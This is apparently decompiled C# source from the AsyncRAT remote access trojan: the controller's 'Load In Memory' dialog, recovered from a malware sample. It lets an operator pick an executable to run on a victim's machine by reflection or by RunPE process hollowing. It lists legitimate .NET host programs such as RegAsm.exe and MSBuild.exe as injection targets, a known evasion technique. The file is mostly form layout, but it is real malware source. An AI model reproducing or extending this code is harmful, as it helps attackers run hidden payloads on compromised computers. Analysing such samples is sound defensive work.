// Decompiled with JetBrains decompiler
// Type: Server.FormSendFileToMemory
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using Server.Helper;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Server
{
  public class FormSendFileToMemory : Form
  {
    public bool IsOK;
    private IContainer components;
    private GroupBox groupBox1;
    private Button button1;
    private Label label2;
    private Label label1;
    public ComboBox comboBox1;
    private Button button2;
    private StatusStrip statusStrip1;
    public ToolStripStatusLabel toolStripStatusLabel1;
    private Label label3;
    public ComboBox comboBox2;
    private Button button3;

    public FormSendFileToMemory() => this.InitializeComponent();

    private void SendFileToMemory_Load(object sender, EventArgs e)
    {
      this.comboBox1.SelectedIndex = 0;
      this.comboBox2.SelectedIndex = 0;
    }

    private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
    {
      switch (this.comboBox1.SelectedIndex)
      {
        case 0:
          this.label3.Visible = false;
          this.comboBox2.Visible = false;
          break;
        case 1:
          this.label3.Visible = true;
          this.comboBox2.Visible = true;
          break;
      }
    }

    private void button1_Click(object sender, EventArgs e)
    {
      using (OpenFileDialog openFileDialog = new OpenFileDialog())
      {
        openFileDialog.Filter = "(*.exe)|*.exe";
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
          this.toolStripStatusLabel1.Text = Path.GetFileName(openFileDialog.FileName);
          this.toolStripStatusLabel1.Tag = (object) openFileDialog.FileName;
          this.toolStripStatusLabel1.ForeColor = Color.Green;
          this.IsOK = true;
          if (this.comboBox1.SelectedIndex != 0)
            return;
          try
          {
            new ReferenceLoader().AppDomainSetup(openFileDialog.FileName);
            this.IsOK = true;
          }
          catch
          {
            this.toolStripStatusLabel1.ForeColor = Color.Red;
            this.toolStripStatusLabel1.Text += " Invalid!";
            this.IsOK = false;
          }
        }
        else
        {
          this.toolStripStatusLabel1.Text = "";
          this.toolStripStatusLabel1.ForeColor = Color.Black;
          this.IsOK = true;
        }
      }
    }

    private void button2_Click(object sender, EventArgs e)
    {
      if (!this.IsOK)
        return;
      this.Hide();
    }

    private void Button3_Click(object sender, EventArgs e)
    {
      this.IsOK = false;
      this.Hide();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormSendFileToMemory));
      this.groupBox1 = new GroupBox();
      this.button1 = new Button();
      this.label2 = new Label();
      this.label3 = new Label();
      this.label1 = new Label();
      this.comboBox2 = new ComboBox();
      this.comboBox1 = new ComboBox();
      this.button2 = new Button();
      this.statusStrip1 = new StatusStrip();
      this.toolStripStatusLabel1 = new ToolStripStatusLabel();
      this.button3 = new Button();
      this.groupBox1.SuspendLayout();
      this.statusStrip1.SuspendLayout();
      this.SuspendLayout();
      this.groupBox1.Controls.Add((Control) this.button1);
      this.groupBox1.Controls.Add((Control) this.label2);
      this.groupBox1.Controls.Add((Control) this.label3);
      this.groupBox1.Controls.Add((Control) this.label1);
      this.groupBox1.Controls.Add((Control) this.comboBox2);
      this.groupBox1.Controls.Add((Control) this.comboBox1);
      this.groupBox1.Location = new Point(12, 12);
      this.groupBox1.Name = "groupBox1";
      this.groupBox1.Size = new Size(319, 183);
      this.groupBox1.TabIndex = 0;
      this.groupBox1.TabStop = false;
      this.groupBox1.Text = "Load in memory";
      this.button1.Location = new Point(112, 87);
      this.button1.Name = "button1";
      this.button1.Size = new Size(201, 30);
      this.button1.TabIndex = 1;
      this.button1.Text = "Browser";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.label2.AutoSize = true;
      this.label2.Location = new Point(6, 90);
      this.label2.Name = "label2";
      this.label2.Size = new Size(38, 20);
      this.label2.TabIndex = 1;
      this.label2.Text = "File:";
      this.label3.AutoSize = true;
      this.label3.Location = new Point(6, 142);
      this.label3.Name = "label3";
      this.label3.Size = new Size(73, 20);
      this.label3.TabIndex = 1;
      this.label3.Text = "Injection:";
      this.label3.Visible = false;
      this.label1.AutoSize = true;
      this.label1.Location = new Point(6, 37);
      this.label1.Name = "label1";
      this.label1.Size = new Size(47, 20);
      this.label1.TabIndex = 1;
      this.label1.Text = "Type:";
      this.comboBox2.DropDownStyle = ComboBoxStyle.DropDownList;
      this.comboBox2.FormattingEnabled = true;
      this.comboBox2.Items.AddRange(new object[5]
      {
        (object) "aspnet_compiler.exe",
        (object) "RegAsm.exe",
        (object) "MSBuild.exe",
        (object) "RegSvcs.exe",
        (object) "vbc.exe"
      });
      this.comboBox2.Location = new Point(112, 139);
      this.comboBox2.Name = "comboBox2";
      this.comboBox2.Size = new Size(201, 28);
      this.comboBox2.TabIndex = 1;
      this.comboBox2.Visible = false;
      this.comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
      this.comboBox1.FormattingEnabled = true;
      this.comboBox1.Items.AddRange(new object[2]
      {
        (object) "Reflection",
        (object) "RunPE"
      });
      this.comboBox1.Location = new Point(112, 34);
      this.comboBox1.Name = "comboBox1";
      this.comboBox1.Size = new Size(201, 28);
      this.comboBox1.TabIndex = 1;
      this.comboBox1.SelectedIndexChanged += new EventHandler(this.comboBox1_SelectedIndexChanged);
      this.button2.Location = new Point(22, 220);
      this.button2.Name = "button2";
      this.button2.Size = new Size(88, 30);
      this.button2.TabIndex = 1;
      this.button2.Text = "OK";
      this.button2.UseVisualStyleBackColor = true;
      this.button2.Click += new EventHandler(this.button2_Click);
      this.statusStrip1.ImageScalingSize = new Size(24, 24);
      this.statusStrip1.Items.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.toolStripStatusLabel1
      });
      this.statusStrip1.Location = new Point(0, 274);
      this.statusStrip1.Name = "statusStrip1";
      this.statusStrip1.Size = new Size(351, 32);
      this.statusStrip1.TabIndex = 2;
      this.statusStrip1.Text = "statusStrip1";
      this.toolStripStatusLabel1.DisplayStyle = ToolStripItemDisplayStyle.Text;
      this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
      this.toolStripStatusLabel1.Size = new Size(24, 25);
      this.toolStripStatusLabel1.Text = "...";
      this.button3.Location = new Point(243, 220);
      this.button3.Name = "button3";
      this.button3.Size = new Size(88, 30);
      this.button3.TabIndex = 3;
      this.button3.Text = "CANCEL";
      this.button3.UseVisualStyleBackColor = true;
      this.button3.Click += new EventHandler(this.Button3_Click);
      this.AutoScaleDimensions = new SizeF(9f, 20f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(351, 306);
      this.ControlBox = false;
      this.Controls.Add((Control) this.button3);
      this.Controls.Add((Control) this.statusStrip1);
      this.Controls.Add((Control) this.button2);
      this.Controls.Add((Control) this.groupBox1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (FormSendFileToMemory);
      this.StartPosition = FormStartPosition.CenterParent;
      this.Text = "Load In Memory";
      this.Load += new EventHandler(this.SendFileToMemory_Load);
      this.groupBox1.ResumeLayout(false);
      this.groupBox1.PerformLayout();
      this.statusStrip1.ResumeLayout(false);
      this.statusStrip1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
